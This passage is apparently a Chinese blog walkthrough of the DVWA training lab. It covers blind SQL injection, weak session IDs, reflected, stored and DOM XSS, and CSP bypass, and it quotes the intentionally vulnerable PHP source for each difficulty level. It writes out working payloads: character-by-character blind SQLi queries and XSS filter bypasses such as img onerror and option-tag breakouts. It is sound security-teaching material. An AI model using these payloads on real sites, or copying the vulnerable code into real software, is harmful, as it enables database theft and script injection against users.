    if( isset( $_GET[ 'Submit' ] ) ) {
        // Get input
        $id = $_GET[ 'id' ];
    
        // Check database
        $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors
    
        // Get results
        $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
        if( $num > 0 ) {
            // Feedback for end user
            echo '<pre>User ID exists in the database.</pre>';
        }
        else {
            // User wasn't found, so the page wasn't!
            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
    
            // Feedback for end user
            echo '<pre>User ID is MISSING from the database.</pre>';
        }
    
        ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
    }
    
    ?> 
    
        

#### 1\. 判断是否能够进行注入，注入是字符型还是数字型

尝试1’ and 1=1#显示存在,再试一下1’ and 1=2#显示不存在，则说明是字符型的sql盲注-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210317112239815.png%23pic_center)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210317112251233.png%23pic_center)

#### 2.猜解当前的数据库名

1.  猜解长度

    输入1' and length(database())=3 # ，显示不存在
    输入1' and length(database())=4 # ，显示存在
    
        

说明数据库名的长度为4

2.  猜解数据库名（采用二分法）

    1' and ascii(substr(database(),1,1))<110 # 	显示存在
    1' and ascii(substr(database(),1,1))<100 # 	显示不存在
    1' and ascii(substr(database(),1,1))=100 # 	显示存在
    
        

这样我们便知道数据库的第一个字符的ascii值为100，对应d

    1' and ascii(substr(database(),4,1))<110 # 	显示存在
    1' and ascii(substr(database(),4,1))<100 # 	显示存在
    1' and ascii(substr(database(),4,1))=97 # 	显示存在
    
        

这样我们便知道数据库的最后一个字符的ascii值为97，对应a-
再猜解第二个和三个可知库名：dvwa。

#### 3.猜解数据库中的表名

1.  首先猜解表数量

    1' and (select count(table_name) from information_schema.tables where table_schema=database())=1 #		显示不存在
    1' and (select count(table_name) from information_schema.tables where table_schema=database())=2 #		显示存在
    
        

则数据库中共有两个表

2.  依次猜解表名，猜解表名跟猜解库名的方法是一样的，不过使用的是下面这一条语句

    1' and length(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1))=9# # 显示存在，说明第一个表名长度为9
    
        

    1' and length(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),2))=5# # 第二个表名长度为5
    
        

3.  猜解表名的一个个字符

    1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))>100 #
    
        

重复该步骤，可猜解出两个表名分别为guestbook和users

#### 4\. 猜解表中列名

1.  猜列数，还是跟上面猜解表数量的步骤是一样的，使用下面这条语句

    1’ and (select count(column_name)from information_schema.columns where table_name=‘users’)=8 #
    
        

找到users表中有8列

2.  猜解每列列名长度，使用下面这条语句

    1' and length(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1))=7 #
    
        

    1’ and length(substr((select column_name from information_schema.columns where table_name=‘users’ limit 0,1),2))=6 #
    
        

说明users表中的第一列为7个字符长度，第二列有为6

3.  猜解列名称

和之前的库的方法一样，第一列名第一位

    1’ and ascii(substr((select column_name from information_schema.columns where table_name=‘users’ limit 0,1),1))>97 #
    
        

    1’ and ascii(substr((select column_name from information_schema.columns where table_name=‘users’ limit 0,1),1))=117 #
    
        

第二位

    1’ and ascii(substr((select column_name from information_schema.columns where table_name=‘users’ limit 0,1),2))=115 #
    
        

第二个列名第一位，把0改为1就是第二个列名

    1’ and ascii(substr((select column_name from information_schema.columns where table_name=‘users’ limit 1,1),1))=102 #
    
        

如此反复最后8个列名为：-
user\_id,first\_name,last\_name,user,password,avatar,last\_login,failed\_login

#### 5.猜解用户名

    1’ and (ascii(substr((select user from users limit 0,1),1,1)))=97 #
    
        

    1’ and (ascii(substr((select user from users limit 0,1),2,1)))=100 #
    
        

最终得到结果用户名为：admin

## Medium

### 源代码

    <?php
    
    if( isset( $_POST[ 'Submit' ]  ) ) {
        // Get input
        $id = $_POST[ 'id' ];
        $id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    
        // Check database
        $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors
    
        // Get results
        $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
        if( $num > 0 ) {
            // Feedback for end user
            echo '<pre>User ID exists in the database.</pre>';
        }
        else {
            // Feedback for end user
            echo '<pre>User ID is MISSING from the database.</pre>';
        }
    
        //mysql_close();
    }
    
    ?> 
    
        

与普通注入相同，中等难度换成了下拉表单，并且对’单引号进行了转义，所以我们仍然打开burpsuite抓包-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F2021032011152365.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210320111539867.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210320111547874.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210320111553727.png)-
则说明注入类型为数字型，而后面的方法与Low相同（去掉’单引号），转义时使用相对应的16进制。

## High

### 源代码

    <?php
    
    if( isset( $_COOKIE[ 'id' ] ) ) {
        // Get input
        $id = $_COOKIE[ 'id' ];
    
        // Check database
        $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors
    
        // Get results
        $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
        if( $num > 0 ) {
            // Feedback for end user
            echo '<pre>User ID exists in the database.</pre>';
        }
        else {
            // Might sleep a random amount
            if( rand( 0, 5 ) == 3 ) {
                sleep( rand( 2, 4 ) );
            }
    
            // User wasn't found, so the page wasn't!
            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
    
            // Feedback for end user
            echo '<pre>User ID is MISSING from the database.</pre>';
        }
    
        ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
    }
    
    ?> 
    
        

从代码`limit 1`可知，只能输入一个字符，但可以添加#将其注释掉-
当查询结果为空时`sleep( rand( 2, 4 ) )`这样便无法进行基于时间的盲注。-
其余与Low基本相同

## Weak Session IDs

## Low

### 源代码

     <?php
    
    $html = "";
    
    if ($_SERVER['REQUEST_METHOD'] == "POST") {
        if (!isset ($_SESSION['last_session_id'])) {
            $_SESSION['last_session_id'] = 0;
        }
        $_SESSION['last_session_id']++;
        $cookie_value = $_SESSION['last_session_id'];
        setcookie("dvwaSession", $cookie_value);
    }
    ?>
    
    
        

`$_SESSION['last_session_id']++;`sessionid每次加1-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F2021032620131343.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326201446156.png)

抓包多次发现的确每次都会加1。-
这里也可以F12查看-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326201528851.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

## Medium

### 源代码

    <?php
    
    $html = "";
    
    if ($_SERVER['REQUEST_METHOD'] == "POST") {
        $cookie_value = time();
        setcookie("dvwaSession", $cookie_value);
    }
    ?> 
    
        

很明显cookie值为时间戳-
F12观察-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326202209909.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)多提交几次会发现，Session每秒加一-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326202434632.png)

## High

### 源代码

     <?php
    
    $html = "";
    
    if ($_SERVER['REQUEST_METHOD'] == "POST") {
        if (!isset ($_SESSION['last_session_id_high'])) {
            $_SESSION['last_session_id_high'] = 0;
        }
        $_SESSION['last_session_id_high']++;
        $cookie_value = md5($_SESSION['last_session_id_high']);
        setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], false, false);
    }
    
    ?>
    
        

`md5($_SESSION['last_session_id_high'])`md5加密。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326202837238.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326202857599.png)-
多次解密发现，每次数值加1

# Cross Site Scripting (XSS)

## 反射型(Reflected)

## Low

### 源代码

    <?php
    
    header ("X-XSS-Protection: 0");
    
    // Is there any input?
    if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
        // Feedback for end user
        echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
    }
    
    ?> 
    
        

没有任何过滤，尝试输入`<script>alert(1)<script>`后直接弹窗-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210320144944562.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

## Medium

### 源代码

    <?php
    
    header ("X-XSS-Protection: 0");
    
    // Is there any input?
    if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
        // Get input
        $name = str_replace( '<script>', '', $_GET[ 'name' ] );
    
        // Feedback for end user
        echo "<pre>Hello ${name}</pre>";
    }
    
    ?> 
    
        

源代码中有str\_replace函数

    str_replace( '<script>', '', $_GET[ 'name' ] );
    
        

这个函数将`<script>`替换成NULL，这里可以使用大小写绕过或双写绕过的方式

1.  双写绕过：

    <sc<script>ript>alert(1)</script>
    
        

2.  大小写绕过：

    <Script>alert(1)</script>
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210320145526232.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

## High

### 源代码

    <?php
    
    header ("X-XSS-Protection: 0");
    
    // Is there any input?
    if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
        // Get input
        $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
    
        // Feedback for end user
        echo "<pre>Hello ${name}</pre>";
    }
    
    ?> 
    
        

High中使用正则函数`preg_replace`进行了过滤，无法使用`<script>`标签注入XSS，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。这样就会避免出现`<script>`标签被正则表达式匹配到。这里我们可以用到`<img src="" onerror=alert(1)>` ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210320151659457.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70%23pic_center)

## 存储型(Stored)

## Low

### 源代码

    <?php
    
    if( isset( $_POST[ 'btnSign' ] ) ) {
        // Get input
        $message = trim( $_POST[ 'mtxMessage' ] );
        $name    = trim( $_POST[ 'txtName' ] );
    
        // Sanitize message input
        $message = stripslashes( $message );
        $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    
        // Sanitize name input
        $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    
        // Update database
        $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    
        //mysql_close();
    }
    
    ?> 
    
        

用到了这三个函数

    trim(string,charlist) 函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括\0、\t、\n、\x0B、\r以及空格。
    
    mysqli_real_escape_string(string,connection) 函数会对字符串中的特殊符号（\x00，\n，\r，\，'，"，\x1a）进行转义。
    
    stripslashes(string) 函数删除字符串中的反斜杠。
    
        

但并没有做xss方面的漏洞检查，因此在Name或者Message尝试输入`<script>alert(1)</script>`，但Name对字数有限制，所以在Message中输入（Name随意输入即可），发现弹窗-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210320162339178.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70%23pic_center)

## Medium

### 源代码

    <?php
    
    if( isset( $_POST[ 'btnSign' ] ) ) {
        // Get input
        $message = trim( $_POST[ 'mtxMessage' ] );
        $name    = trim( $_POST[ 'txtName' ] );
    
        // Sanitize message input
        $message = strip_tags( addslashes( $message ) );
        $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $message = htmlspecialchars( $message );
    
        // Sanitize name input
        $name = str_replace( '<script>', '', $name );
        $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    
        // Update database
        $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    
        //mysql_close();
    }
    
    ?> 
    
        

Medium中发现新函数

    strip_tags()函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用<b>标签。
    
    addslashes()函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。
    
    htmlspecialchars()将特殊字符转换为 HTML 实体
    
    str_replace()字符串替代，这里将script替换成 NULL
    
        

由于Message进行了`htmlspecialchars`处理，所以在Messgae中输入`<script>alert(1)</script>`只会显示`alert(1)`，但只对Name进行了简单的过滤，因此可以从Name中进行双写绕过或大小写绕过攻击，但Name对字数进行了限制，所以只能抓包再攻击。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210320164402528.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210320164411155.png)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210320164437354.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

## High

### 源代码

     <?php
    
    if( isset( $_POST[ 'btnSign' ] ) ) {
        // Get input
        $message = trim( $_POST[ 'mtxMessage' ] );
        $name    = trim( $_POST[ 'txtName' ] );
    
        // Sanitize message input
        $message = strip_tags( addslashes( $message ) );
        $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $message = htmlspecialchars( $message );
    
        // Sanitize name input
        $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
        $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    
        // Update database
        $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    
        //mysql_close();
    }
    
    ?>
    
    
        

这里使用正则表达式过滤了`<script>`标签，但是却忽略了img、body、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。Burpsuite抓包改name参数为`<img src=1 onerror=alert(1)>`Forward后成功弹窗。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210320165035263.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210320165046575.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

## DOM型
## Low

### 源代码

    <?php
    
    # No protections, anything goes
    
    ?> 
    
        

没有一丝过滤，直接在网页上修改下拉框上传参数的值-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210320171516157.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)检查元素也可发现已插入代码中-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F2021032017163981.png)

## Medium

### 源代码

    <?php
    
    // Is there any input?
    if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
        $default = $_GET['default'];
        
        # Do not allow script tags
        if (stripos ($default, "<script") !== false) {
            header ("location: ?default=English");
            exit;
        }
    }
    
    ?> 
    
        

`array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ])` 检查default参数是否为空，如果不为空则将default等于获取到的default值。这里还使用了`stripos()` 用于检测default值中是否有 <script ，如果有的话，则将 default=English 。-
既然过滤了<script,我们可以尝试img事件`<img src=1 οnerrοr=alert(1)>`-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F202103201721598.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
却没有任何弹窗，检查元素发现-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210320172329553.png)-
被插入到了value值中，但是并没有插入到option标签的值中，所以img标签并没有发起任何作用。因此应先闭合前面的标签，构造闭合的option标签`></option></select><img src=1 onerror=alert(1)>`,输入后弹窗-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210320172758544.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70%23pic_center)证明语句成功执行了，再查看元素-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210320172935924.png)发现已经插入成功

## High

### 源代码

    <?php
    
    // Is there any input?
    if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    
        # White list the allowable languages
        switch ($_GET['default']) {
            case "French":
            case "English":
            case "German":
            case "Spanish":
                # ok
                break;
            default:
                header ("location: ?default=English");
                exit;
        }
    }
    
    ?> 
    
        

判断defalut值是否为空，如果不为空的话，再用switch语句进行匹配，如果匹配成功，则插入case字段的相应值，如果不匹配，则插入的是默认的值。这样的话，我们的语句就没有可能插入到页面中了,这样即便我们构造了语句在访问后也没有用。-
这里我们可以利用url中 **#** 号的特殊性，URL中 **#** 号之后的内容，不会被提交到服务器，可以直接与浏览器进行交互。因此我们在 **#** 后构造语句`#></option></select><img src=1 onerror=alert(1)>`（#号前加一个空格）

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210320174537952.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
执行后发现弹窗，查看元素，发现也已经插入成功了。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210320175037847.png)

# Content Security Policy (CSP) Bypass

CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行

## Low

### 源代码

    <?php
    
    $headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;"; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics.
    
    header($headerCSP);
    
    # These might work if you can't create your own for some reason
    # https://pastebin.com/raw/R570EE00
    # https://hastebin.com/raw/ohulaquzex
    
    ?>
    <?php
    if (isset ($_POST['include'])) {
    $page[ 'body' ] .= "
        <script src='" . $_POST['include'] . "'></script>
    ";
    }
    $page[ 'body' ] .= '
    <form name="csp" method="POST">
        <p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:</p>
        <input size="50" type="text" name="include" value=""  />
        <input type="submit" value="Include" />
    </form>
    ';
    
        

看源代码或者F12都能看到它信任的网站，我们将js代码写到它信任的网站中-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326173706577.png)-
所以我们可以在[pastebin.com](https://pastebin.com/)写一个js的弹窗-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F2021032617450790.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326174528454.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
然后记下网址[https://pastebin.com/raw/6q9QrRvS](https://pastebin.com/raw/6q9QrRvS)，在DVWA中输入后Include。

## Medium

### 源代码

    <?php
    
    $headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";
    
    header($headerCSP);
    
    // Disable XSS protections so that inline alert boxes will work
    header ("X-XSS-Protection: 0");
    
    # <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
    
    ?>
    <?php
    if (isset ($_POST['include'])) {
    $page[ 'body' ] .= "
        " . $_POST['include'] . "
    ";
    }
    $page[ 'body' ] .= '
    <form name="csp" method="POST">
        <p>Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.</p>
        <input size="50" type="text" name="include" value=""  />
        <input type="submit" value="Include" />
    </form>
    ';
    
        

在源码中发现了注释 `<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>`，尝试输入后Include-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326175954398.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
其实这里-
`unsafe-inline`允许使用内联资源-
`nonce-source`仅允许特定的内联脚本块，nonce=“TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA”

## High

### 源代码

     <?php
    $headerCSP = "Content-Security-Policy: script-src 'self';";
    
    header($headerCSP);
    
    ?>
    <?php
    if (isset ($_POST['include'])) {
    $page[ 'body' ] .= "
        " . $_POST['include'] . "
    ";
    }
    $page[ 'body' ] .= '
    <form name="csp" method="POST">
        <p>The page makes a call to ' . DVWA_WEB_PAGE_TO_ROOT . '/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</p>
        <p>1+2+3+4+5=<span ></span></p>
        <input type="button"  value="Solve the sum" />
    </form>
    
    <script src="source/high.js"></script>
    ';
    
    vulnerabilities/csp/source/high.js
    function clickButton() {
        var s = document.createElement("script");
        s.src = "source/jsonp.php?callback=solveSum";
        document.body.appendChild(s);
    }
    
    function solveSum(obj) {
        if ("answer" in obj) {
            document.getElementById("answer").innerHTML = obj['answer'];
        }
    }
    
    var solve_button = document.getElementById ("solve");
    
    if (solve_button) {
        solve_button.addEventListener("click", function() {
            clickButton();
        });
    }
    
    
        

`script-src ‘self’`只允许加载自身js-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326182105302.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
构造语句`include=<script src="source/jsonp.php?callback=alert(1)"></script>`-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326182928933.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326183345470.png)

# JavaScript Attacks

## low

### 源代码

    <?php
    $page[ 'body' ] .= <<<EOF
    <script>
    
    /*
    MD5 code from here
    https://github.com/blueimp/JavaScript-MD5
    */
    
